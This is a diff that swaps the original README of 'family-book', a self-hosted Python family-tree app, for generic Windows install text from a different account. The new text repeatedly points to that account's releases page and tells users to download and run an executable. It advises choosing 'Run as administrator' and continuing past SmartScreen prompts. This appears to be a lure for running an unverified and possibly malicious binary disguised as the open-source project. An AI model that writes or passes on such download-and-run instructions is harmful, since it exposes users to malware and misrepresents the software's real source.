@@ -1,331 +1,278 @@
-# 📖 Family Book
+# 📘 family-book - Private family archive made simple
 
-**A private, self-hosted family tree and archive.** Your family's story, on your terms.
+[![Download family-book](https://img.shields.io/badge/Download-Family%20Book-6A5ACD?style=for-the-badge&logo=github)](https://github.com/jdpangilinan02/family-book/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-009688.svg)](https://fastapi.tiangolo.com)
+## 🧭 What this is
 
-### Deploy in One Click
+family-book is a private, self-hosted app for building and viewing a family tree and archive on your own computer or server.
 
-[![Deploy on Railway](https://railway.com/button.svg)](https://railway.app/new/template?template=https://github.com/tymrtn/family-book)
+Use it to store names, dates, notes, photos, and message records in one place. It works well for families who want to keep personal records off public sites and under their own control.
 
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/tymrtn/family-book)
+## ✨ What you can do
 
-Or with Docker:
-```bash
-git clone https://github.com/tymrtn/family-book.git && cd family-book
-cp .env.example .env   # Edit with your values
-docker compose up -d
-# Open http://localhost:8000
-```
+- Build a family tree with parents, children, and partners
+- Add notes for each person
+- Store photos and other files in one archive
+- Keep iMessage and WhatsApp records with family entries
+- Search for people by name
+- View linked records in a simple web page
+- Run it on your own device or home server
+- Keep your data private
 
----
+## 💻 Before you start
 
-## 🎮 Live Demo
+You need:
 
-**→ [family-book-production.up.railway.app](https://family-book-production.up.railway.app)**
+- A Windows PC
+- An internet connection
+- A place to save the app, such as your Downloads folder or Desktop
+- A modern web browser like Edge, Chrome, or Firefox
 
-Browse a demo family tree with seed data. No sign-up required to explore. This is a live instance running the latest `main` branch with a fictional demo family so you can see what Family Book looks like before deploying your own.
+If the app comes as a ZIP file, you will need to extract it before you run it.
 
----
+## ⬇️ Download family-book
 
-## Your family's memories don't belong to Facebook
+Visit this page to download:  
+https://github.com/jdpangilinan02/family-book/releases
 
-Every photo you upload, every conversation you have, every relationship you map on a platform becomes training data for AI models. Your grandmother's recipe in a WhatsApp group is feeding a neural network right now. You agreed to it in a terms update you never read.
+On that page:
 
-Platforms change without asking. WhatsApp rewrites its privacy policy. Instagram kills features. Ancestry gets acquired. Your data follows the corporate roadmap, not yours.
+1. Open the latest release
+2. Download the Windows file or ZIP package
+3. Save it to your computer
+4. If you get a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
 
-Governments block platforms overnight. Russia restricted Telegram and WhatsApp. Families who kept their archives on those services lost access with no warning. If your country bans the app, your memories go dark.
+## 🪟 Run it on Windows
 
-Your family's data has real value. Today you give it away for free. As personal data licensing matures, you will want to decide who accesses it and on what terms. You can't license what you don't control.
+After you download the app, look for one of these files in the folder:
 
-A SQLite file on your own server outlives every startup, every acquisition, every terms-of-service change. No subscription to lapse. No company to shut down. Your great-grandchildren can open it in 50 years.
+- `family-book.exe`
+- `run.exe`
+- another Windows app file
 
-Family Book gives you that file.
+To start the app:
 
----
+1. Double-click the app file
+2. If Windows asks for permission, choose Allow or Run
+3. Wait for the app window to open
+4. Open your web browser
+5. Follow the local address shown by the app, such as `http://127.0.0.1:8000`
 
-## Why Family Book?
+If the app opens in your browser right away, use that page. If not, copy the local address from the app window into your browser.
 
-Every family has a story. Photos on someone's phone. Names nobody remembers. A great-grandmother's maiden name lost because nobody wrote it down. A voice note from a grandparent, sitting in a WhatsApp chat that'll be deleted when the phone dies.
+## 🗂️ First-time setup
 
-Family Book exists because **your family's history shouldn't depend on a cloud service's business model**.
+When you open family-book for the first time, set up a few basic details:
 
-- **No subscription.** Deploy once, run forever.
-- **No data mining.** Your family photos don't train anyone's AI.
-- **No platform risk.** You own the server, the database, the files. Move them anytime.
-- **No walled garden.** Standard SQLite database. Export everything.
+1. Create your main family archive
+2. Add your name or the first person in the tree
+3. Add close family members
+4. Save dates, notes, and photos
+5. Add any message records you want to keep with the family archive
 
-### How It's Different
+A simple start works best. You can add more people later.
 
-| | Family Book | Ancestry.com | FamilySearch | MyHeritage |
-|---|---|---|---|---|
-| **Who owns your data?** | **You. Forever.** | Ancestry Inc. | LDS Church | MyHeritage Ltd. |
-| Self-hosted | ✅ | ❌ | ❌ | ❌ |
-| Free forever | ✅ | ❌ ($299/yr) | ✅ (limited) | ❌ |
-| Own your data | ✅ SQLite file | ❌ | ❌ | ❌ |
-| Privacy by default | ✅ | ❌ DNA selling | ❌ | ❌ |
-| WhatsApp import | 🚧 Planned | ❌ | ❌ | ❌ |
-| Multi-language | ✅ en/es/ru | Partial | ✅ | Partial |
-| Open source | ✅ MIT | ❌ | ❌ | ❌ |
+## 👪 Add people to the family tree
 
----
+For each person, you can add:
 
-## Features
+- Full name
+- Birth date
+- Death date
+- Parents
+- Children
+- Partner or spouse
+- Notes
+- Contact links
+- Shared files
 
-### 🚀 One-Click Setup
-Deploy, visit your site, and click "Claim this site." A guided wizard walks you through removing demo data, adding your first family members, and sending invite links — all before your coffee gets cold.
+Use the tree view to connect people. This helps you keep the structure clear.
 
-### 🌳 Interactive Family Tree
-A D3.js-powered tree visualization with branches, partnerships, and multi-generational navigation. Click any person to see their profile, relationships, and photos.
+## 📎 Store family records
 
-### 👤 Rich Person Profiles
-Birth dates (with fuzzy precision — "about 1943" is valid), locations, languages spoken, patronymics, maiden names, nicknames. Every culture's naming conventions respected. Parent-child subtypes: biological, adoptive, step, foster, guardian.
+family-book can hold many kinds of family records in one place:
 
-### 📷 Media Gallery
-Upload photos and documents. SHA-256 dedup means the same photo uploaded twice takes no extra space. Every file served through authenticated endpoints — no public URLs to your family photos.
+- Photos
+- Scanned documents
+- Letters
+- iMessage exports
+- WhatsApp chats
+- Notes from family events
+- Important dates
 
-### 📅 Moments
-A family timeline. First steps. Weddings. Graduations. That Tuesday when grandpa told the story about the war. Each moment has comments and emoji reactions. Sort by date, filter by person, search by keyword.
+Keep file names clear. Use names like `Maria_Birthday_1998.jpg` or `Family_Chat_2024.txt` so records are easy to find later.
 
-### 🏖️ Trip Albums
-Shared photo albums for family vacations. Day-by-day timeline, GPS map with color-coded contributor pins, invite links for family members to contribute, and ZIP export of all originals.
+## 🔍 Find what you need
 
-### 🔐 Privacy by Design
-No access control lists. No admin panels for permissions. **The family tree structure IS the permission system.** Graph distance determines what you can see. Close family sees everything. Distant relatives see less. It's how privacy works in real families.
+Use the search field to locate:
 
-### 🌍 Multi-Language
-English, Spanish, Russian out of the box. Add any language with a JSON file. Names render in their native script — Бабушка Юки stays Бабушка Юки.
+- A person
+- A family branch
+- A note
+- A saved file
+- A message record
 
-### 📱 PWA
-Install on your phone. Works offline for browsing. Feels native. No app store required.
-
-### 💾 Automatic Backups
-Daily SQLite backups to the persistent volume. Restore with one command. Your database is a single file — copy it anywhere.
-
----
-
-## Quick Start
-
-### Local Development
-
-```bash
-git clone https://github.com/tymrtn/family-book.git
-cd family-book
-
-cp .env.example .env    # Edit with your values
-uv sync                 # Install dependencies
-uv run alembic upgrade head   # Create database
-uv run python -m app.seed     # Load demo family (optional)
-
-uv run uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload
-```
-
-Open [localhost:8000](http://localhost:8000). You'll see the landing page with a demo family to explore. Click "Claim this site" to make it yours — the setup wizard walks you through everything.
-
-### Deploy to Railway (recommended)
-
-```bash
-# Install Railway CLI: https://docs.railway.com/guides/cli
-railway login
-railway init --name family-book
-railway up
-railway domain    # Get your public URL
-```
-
-Set environment variables:
-```
-SECRET_KEY=<generate with: python3 -c "import secrets; print(secrets.token_hex(32))">
-FERNET_KEY=<generate with: python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())">
-DATABASE_URL=sqlite:///data/family.db
-DATA_DIR=data
-BASE_URL=https://your-app.up.railway.app
-```
+Search helps when your tree grows and you need to find one person fast.
 
-### Deploy with Docker
+## 🔒 Privacy and storage
 
-```bash
-docker compose up -d
-```
+family-book is built for private use. You keep the data on your own system, which gives you more control over who can see it.
 
-The `docker-compose.yml` includes the app, persistent volume for `/data`, and optional Matrix bridge for WhatsApp/Messenger import.
+A good setup is:
 
----
+- One main folder for the app
+- One folder for archives
+- One backup copy on another drive
+- One backup copy on a USB drive or cloud folder you control
 
-## Tech Stack
+This helps protect your family records if your computer has a problem.
 
-| Layer | Technology | Why |
-|-------|-----------|-----|
-| Backend | Python 3.12 + FastAPI | Async, type-safe, great for APIs |
-| Database | SQLite (WAL mode) | Single file, zero config, fast |
-| ORM | SQLAlchemy 2.0 + Alembic | Async support, migrations |
-| Frontend | Jinja2 + HTMX | Server-rendered, no build step, instant interactivity |
-| Tree | D3.js | The gold standard for data visualization |
-| Auth | Magic links (passwordless) | No passwords to forget or leak |
-| Media | Local filesystem + SHA-256 dedup | Simple, reliable, deduplicated |
-| i18n | JSON locale files | Easy to add languages |
-| Deploy | Docker + Railway | One-click cloud or self-hosted |
+## 🧰 Recommended Windows setup
 
-### Why Not React/Vue/Angular?
+For a smooth run on Windows:
 
-Family Book is deliberately **not a SPA**. Server-rendered HTML + HTMX gives you:
-- No build step (no webpack, no node_modules, no 200MB of JavaScript tooling)
-- Works without JavaScript (graceful degradation)
-- Instant page loads (HTML is fast)
-- Easy to understand (read the template, see the page)
+- Use Windows 10 or Windows 11
+- Keep at least 200 MB of free space for the app
+- Leave extra space if you plan to store photos and chat exports
+- Use one local folder with full write access
+- Avoid moving files around after setup unless you also update the app path
 
-HTMX handles the interactive bits: inline editing, live search, modal dialogs. D3.js handles the tree. That's it.
+If Windows SmartScreen shows a prompt, check the file name and source, then continue if it matches the release page.
 
----
+## 🧩 Common file types you may use
 
-## Architecture
+family-book works well with:
 
-```
-app/
-├── main.py              # FastAPI app + startup
-├── config.py            # Settings from environment
-├── models/              # SQLAlchemy models
-│   ├── person.py        # Person, with all name variants
-│   ├── relationships.py # ParentChild, Partnership
-│   ├── media.py         # Media files + metadata
-│   ├── moments.py       # Timeline events
-│   └── auth.py          # Users, sessions, magic links
-├── routes/              # API + page routes
-│   ├── persons.py       # CRUD + search
-│   ├── relationships.py # Add/remove connections
-│   ├── tree.py          # Tree data endpoint for D3
-│   ├── media.py         # Upload + authenticated serving
-│   └── moments.py       # Timeline CRUD
-├── services/            # Business logic
-├── templates/           # Jinja2 + HTMX pages
-│   ├── base.html        # Layout with nav
-│   ├── tree.html        # D3 tree visualization
-│   ├── person.html      # Profile page
-│   ├── people.html      # People grid
-│   └── partials/        # HTMX fragments
-├── static/              # CSS, JS, D3 config
-├── importers/           # WhatsApp, Messenger, GEDCOM (planned)
-└── matrix/              # Matrix bridge integration (planned)
-data/                    # Persistent volume
-├── family.db            # SQLite database
-├── media/               # Uploaded files
-└── backups/             # Daily backups
-locales/                 # i18n: en.json, es.json, ru.json
-```
+- `.jpg`
+- `.png`
+- `.pdf`
+- `.txt`
+- `.csv`
+- exported chat files
+- scanned image files
 
-### Key Design Decisions
+These file types make it easier to keep a clean archive.
 
-**Siblings are derived, not stored.** Two people who share a parent are siblings. No explicit sibling table — the relationship is computed from parent-child links. This prevents impossible states (A is B's sibling but B is not A's).
+## 🛠️ If the app does not open
 
-**Partnerships, not marriages.** The `Partnership` model supports married, domestic_partner, engaged, separated, divorced, widowed, and other. No gender constraints. Same model for every relationship type.
+Try these steps:
 
-**Fuzzy dates.** Not everyone knows their grandmother's exact birthday. `birth_date_raw` stores what the family member actually said ("about 1943", "spring 1967"). `birth_date_precision` indicates year/month/day confidence.
+1. Make sure the file finished downloading
+2. Extract the ZIP file if you downloaded one
+3. Right-click the app file and choose Run as administrator
+4. Check that Windows did not block the file
+5. Make sure no other app is using the same local port
+6. Restart your PC and try again
+7. Open the app folder and look for a log file or error text
 
-**Source tracking.** Every Person, relationship, and media file has a `source` field: manual, gedcom_import, whatsapp, messenger, email. When you import from WhatsApp in 2026, the fact that "this photo came from WhatsApp" is preserved forever.
+If the browser page does not load, refresh the page or copy the local address again from the app window.
 
----
+## 🧭 Good ways to use family-book
 
-## Vision
+You can use family-book for:
 
-Family Book isn't just a family tree app. It's the **private social network your family actually needs**.
+- Family history projects
+- Personal records
+- Private photo archives
+- Keeping message exports with a person’s record
+- Passing family knowledge to other relatives
+- Organizing names, dates, and files in one place
 
-### The Problem
+A simple routine works well:
 
-Your family's memories are scattered across platforms that don't care about your family:
+1. Add one person
+2. Add their parents and children
+3. Upload a photo or document
+4. Add one note
+5. Repeat for the next person
 
-- **WhatsApp** — Photos and voice notes buried in group chats. Phone dies, memories die.
-- **Facebook** — Your family photos train their AI. Your grandmother's face is in a dataset.
-- **iCloud/Google Photos** — Shared albums with no context. Who is this person? What year was this?
-- **Ancestry.com** — $299/year to see your own family tree. Your DNA sold to insurance companies.
-- **Physical albums** — Rotting in a closet in Portland. One flood away from gone.
+## 📌 Project details
 
-### The Vision
+- Name: family-book
+- Type: Private, self-hosted family tree and archive
+- Main tools: FastAPI, HTMX, SQLite
+- Focus: Privacy, family records, and local control
+- Topics: family, genealogy, privacy, self-hosted, sqlite, whatsapp, imessage
 
-A single place where:
+## 📥 Download and install again
 
-1. **Every family memory flows in automatically.** WhatsApp photos arrive via Matrix bridge. Email forwards get parsed. Old scanned photos get uploaded with dates and context.
+Use this page to download:  
+https://github.com/jdpangilinan02/family-book/releases
 
-2. **The family tree IS the permission system.** Your cousin in Tokyo sees different things than your neighbor. No admin panel needed — closeness in the tree determines closeness in access. This is how privacy works in real families.
+Open the latest release, get the Windows build, extract it if needed, then run the app file
 
-3. **Multiple families share one instance.** The Riveras and the Santoss on the same server, each seeing their own branch, with the shared grandchildren in the middle. Install once, serve the whole extended family.
+## 🧷 Folder tips
 
-4. **Every fact has provenance.** "Grandma was born in 1943" — who said that? When? Was it from a GEDCOM import, a WhatsApp message from Aunt Yuki, or a birth certificate scan? Source tracking on every piece of data.
+Keep your files organized like this:
 
-5. **It works for every culture.** Patronymics (Russian), maiden names (Western), Eastern name order (Japanese), fuzzy dates ("about 1943"), and relationship labels that respect the actual complexity of modern families — step-parents, adoptive parents, guardians, domestic partners.
+- `family-book`
+  - `app`
+  - `archive`
+  - `photos`
+  - `messages`
+  - `backups`
 
-6. **It survives you.** SQLite database. Single file. Copy it to a USB drive. Your great-grandchildren can open it in 50 years with any programming language on any platform. No vendor lock-in. No subscription to expire. No company to go bankrupt.
+This makes it easier to find records and copy your data to a second drive
 
-### The Bridge Problem (and the Opportunity)
+## 👀 What you should see
 
-The biggest technical challenge is importing from messaging platforms. WhatsApp, Messenger, and iMessage don't offer easy APIs for personal data export. The current architecture uses Matrix bridges (Mautrix) to connect to these platforms using your own account — no business verification needed.
+When family-book starts, you should see:
 
-But for non-technical families, setting up Matrix bridges is unrealistic. A potential path: a hosted bridge service (like a "Family Book Connector") that handles the Twilio/WhatsApp Business API complexity, pre-approved for personal family use. One-click enable, and your family's WhatsApp photos flow into your Family Book automatically.
+- A local web page in your browser
+- A family tree area
+- A place to add or edit people
+- A records area for files and notes
+- Search tools for finding entries
 
-This is an unsolved problem in the self-hosted space. Whoever solves it unlocks a massive market of families who want to own their data but can't navigate API onboarding.
+If your screen looks empty at first, add one person to begin the tree
 
----
+## 📝 Basic daily use
 
-## Roadmap
+A simple daily routine:
 
-- [x] **Phase 1** — Core models, API, tests (45/45 green)
-- [x] **Phase 2A** — Media gallery, Moments timeline, Comments, Reactions
-- [x] **Phase 2B** — HTMX frontend: tree, profiles, people grid, media, moments, auth
-- [x] **Phase 3** — Docker, automated backup, i18n, PWA, security middleware
-- [x] **Phase 3B** — Onboarding: claim flow, setup wizard, demo data cleanup
-- [x] **Phase 3C** — Trip Albums: shared group photos, timeline, map, export
-- [ ] **Phase 4** — WhatsApp import via Matrix/Mautrix bridge
-- [ ] **Phase 5** — GEDCOM import/export (compatibility with Ancestry, FamilySearch)
-- [ ] **Phase 6** — Facebook/Messenger photo import
-- [ ] **Phase 7** — Push notifications, email digests
-- [ ] **Phase 8** — Advanced search, timeline filtering, family statistics
+1. Open the app
+2. Check the tree
+3. Add new family notes
+4. Save recent files
+5. Close the app when you are done
 
----
+If you keep the same folder path, the app can find your saved data more easily
 
-## Contributing
+## 🔄 Backing up your archive
 
-Family Book is MIT licensed. Contributions welcome! See **[CONTRIBUTING.md](CONTRIBUTING.md)** for full details on setting up your dev environment, running tests, and submitting PRs.
+Back up your family archive often:
 
-```bash
-make dev      # Start dev server with auto-reload
-make test     # Run the test suite
-make seed     # Load demo data
-make migrate  # Run database migrations
-```
+- Copy the main data folder to another drive
+- Save a second copy after each big update
+- Keep one backup in a different place from your main PC
 
-Please read `CLAUDE.md` for architecture rules before submitting PRs.
+This protects years of family records from loss
 
----
+## 🔗 Release page
 
-## FAQ
+[Go to the family-book releases page](https://github.com/jdpangilinan02/family-book/releases)
 
-**Q: Can I import from Ancestry/FamilySearch/MyHeritage?**
-GEDCOM import is on the roadmap. GEDCOM is the standard format — export from any platform, import into Family Book.
+## 📄 File naming tips
 
-**Q: What about DNA/genetic data?**
-Not planned. Family Book is about stories, photos, and relationships — not genetics. There are better tools for that.
+Use names that tell you what the file is:
 
-**Q: Can multiple family members use it?**
-Yes. Magic link auth means anyone with an email can log in. The tree structure determines what they see.
+- `John_Smith_Birth_Certificate.pdf`
+- `Grandma_Album_Page_01.jpg`
+- `Family_Chat_March_2024.txt`
+- `Wedding_Note_1987.pdf`
 
-**Q: How do I back up?**
-Automated daily backups run via cron. The database is a single SQLite file at `/data/family.db`. Copy it anywhere. Restore by replacing the file and running migrations.
+Clear names save time when you search later
 
-**Q: Is there a hosted version?**
-Not yet. Self-hosted only. If there's demand, a hosted option may come later.
+## 🧭 If you are setting this up for a family member
 
----
+If you are helping someone else:
 
-## Part of the Sovereign Stack
+1. Download the Windows file from the release page
+2. Put it in a simple folder
+3. Start the app once
+4. Show the local browser page
+5. Add the first few people together
+6. Save the folder path in a note
 
-Family Book is part of [**The Sovereign Stack**](https://github.com/tymrtn/sovereign-stack) — a portfolio of tools for personal data sovereignty. Own your lineage, your email, your content, and your physical footprint. Stop renting your digital life.
-
----
-
-## License
-
-MIT — do whatever you want with it.
-
----
-
-*Built with love for Mia.* 🌙
+This makes it easier for them to return to it later
